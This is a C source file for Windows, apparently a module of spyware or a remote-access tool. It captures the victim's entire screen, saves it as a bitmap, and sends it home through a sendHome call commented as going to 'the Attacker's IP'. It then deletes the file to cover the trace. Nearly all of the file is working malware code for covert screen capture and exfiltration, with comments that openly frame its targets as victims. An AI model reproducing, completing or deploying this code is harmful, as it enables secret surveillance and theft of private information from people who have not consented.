#include "config.h"

int screenshot()
{
	char translaterPath[MAX_PATH];
	size_t sizeConverted;

	//Filepath for screenshot
	TCHAR path[] = _T("C:\\Users\\Franco\\Desktop\\x.bmp");

	//Get Victim's screen dimensions.
	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN) - GetSystemMetrics(SM_XVIRTUALSCREEN);

	//Retrieve a handle to a device context.
	HDC screenContext = GetDC(NULL);
	if (!screenContext)
	{
		_tprintf(_T("ERROR: GetDC function call."));
		return 1;
	}

	//Create a memory device context.
	HDC compatContext = CreateCompatibleDC(screenContext);
	if (!compatContext)
	{
		_tprintf(_T("ERROR: CreateCompatibleDC function call."));
		return 1;
	}

	//Create a bitmap object.
	HBITMAP bitmap = CreateCompatibleBitmap(screenContext, width, height);
	if (!bitmap)
	{
		_tprintf(_T("ERROR: CreateCompatibleBitmap function call."));
		return 1;
	}

	//Select device context object.
	HGDIOBJ exContext = SelectObject(compatContext, bitmap);
	if (!exContext)
	{
		_tprintf(_T("ERROR: SelectObject function call."));
		return 1;
	}

	//performs a bit-block transfer of the color data corresponding to a rectangle 
	//of pixels from the specified source device context into a destination device context.
	if (!BitBlt(compatContext, 0, 0, width, height, screenContext, 0, 0, SRCCOPY))
	{
		_tprintf(_T("ERROR: BitBlt function call."));
		return 1;
	}

	//Creates a file out of the BMP object.
	if (createBMPFile(path, createBitmapInfo(bitmap), bitmap, compatContext))
	{
		_tprintf(_T("ERROR: createBMPFile function call ."));
		return 1;
	}

	//Delete device context.
	if (!DeleteDC(compatContext))
	{
		_tprintf(_T("ERROR: DeleteDC function call failed."));
		return 1;
	}

	//Release device context.
	if (!ReleaseDC(NULL, screenContext))
	{
		_tprintf(_T("ERROR: ReleaseDC function call failed."));
		return 1;
	}

	//Deletes a logical pen, brush, font, bitmap, region, or palette,
	//freeing all system resources associated with the object.
	if (!DeleteObject(bitmap))
	{
		_tprintf(_T("ERROR: DeleteObject function call failed."));
		return 1;
	}

	//Convert TCHAR to char buffer.
	if (wcstombs_s(&sizeConverted, translaterPath, MAX_PATH, path, MAX_PATH))
	{
		_tprintf(_T("ERROR: wcstombs_s function call failed."));
		return 1;
	}

	//Send screenshot to the Attacker's IP.
	if (sendHome(translaterPath, 1))
	{
		_tprintf(_T("ERROR: sendHome function call failed."));
	}

	//Delete screenshot after it has been sent.
	if (!DeleteFileA(translaterPath))
	{
		_tprintf(_T("ERROR: DeleteFileA function call failed."));
		return 1;
	}

	return 0;
}

int createBMPFile(LPTSTR filePath, PBITMAPINFO bitmapInfo, HBITMAP bitmap, HDC compatContext)
{
	BITMAPFILEHEADER header;
	DWORD temp;

	//Set up object for bitmap header.
	PBITMAPINFOHEADER infoHeader = (PBITMAPINFOHEADER)bitmapInfo;
	LPBYTE bytes = (LPBYTE)malloc(infoHeader->biSizeImage);
	HANDLE handle = CreateFile(filePath, GENERIC_WRITE, (DWORD)0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);

	//retrieves the bits of the specified compatible bitmap and  
	//copies them into a buffer as a DIB using the specified format.                          
	if (!GetDIBits(compatContext, bitmap, 0, (WORD)infoHeader->biHeight, bytes, bitmapInfo, DIB_RGB_COLORS))
	{
		_tprintf(_T("ERROR: GetDIBits function call."));
		return 1;
	}

	header.bfType = 0x4d42;
	header.bfReserved1 = 0;
	header.bfReserved2 = 0;
	header.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + infoHeader->biSize
		+ infoHeader->biClrUsed * sizeof(RGBQUAD);
	header.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) + infoHeader->biSize
		+ infoHeader->biClrUsed * sizeof(RGBQUAD) + infoHeader->biSizeImage);

	//Write to file in 3 steps. Write files infoheader, header, and bitmap data in that order.
	if (!WriteFile(handle, (LPVOID)&header, sizeof(BITMAPFILEHEADER), (LPDWORD)&temp, NULL))
	{
		_tprintf(_T("ERROR: WriteFile function call, infoheader."));
		return 1;
	}

	if (!WriteFile(handle, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER)
		+ infoHeader->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&temp, (NULL)))
	{
		_tprintf(_T("ERROR: WriteFile function call, header."));
		return 1;
	}

	if (!WriteFile(handle, (LPSTR)bytes, (int)infoHeader->biSizeImage, (LPDWORD)&temp, NULL))
	{
		_tprintf(_T("ERROR: WriteFile function call, body."));
		return 1;
	}

	//Close handle.
	if (!CloseHandle(handle))
	{
		_tprintf(_T("ERROR: CloseHandle function call."));
		return 1;
	}

	//Free allocated memory.
	free(bytes); free(bitmapInfo);

	return 0;
}

PBITMAPINFO createBitmapInfo(HBITMAP bitmapHandle)
{
	BITMAP bitmap;

	//Set up object for bitmap header.
	GetObject(bitmapHandle, sizeof(BITMAP), (LPSTR)&bitmap);
	WORD colorBits = (WORD)(bitmap.bmPlanes * bitmap.bmBitsPixel);
	PBITMAPINFO mapInfo = (PBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER));

	//Sets the header information for the bitmap.
	mapInfo->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	mapInfo->bmiHeader.biWidth = bitmap.bmWidth;
	mapInfo->bmiHeader.biHeight = bitmap.bmHeight;
	mapInfo->bmiHeader.biPlanes = bitmap.bmPlanes;
	mapInfo->bmiHeader.biBitCount = bitmap.bmBitsPixel;
	mapInfo->bmiHeader.biCompression = BI_RGB;
	mapInfo->bmiHeader.biClrImportant = 0;
	mapInfo->bmiHeader.biSizeImage = ((mapInfo->bmiHeader.biWidth * colorBits + 31)
		& ~31) / 8 * mapInfo->bmiHeader.biHeight;

	return mapInfo;
}
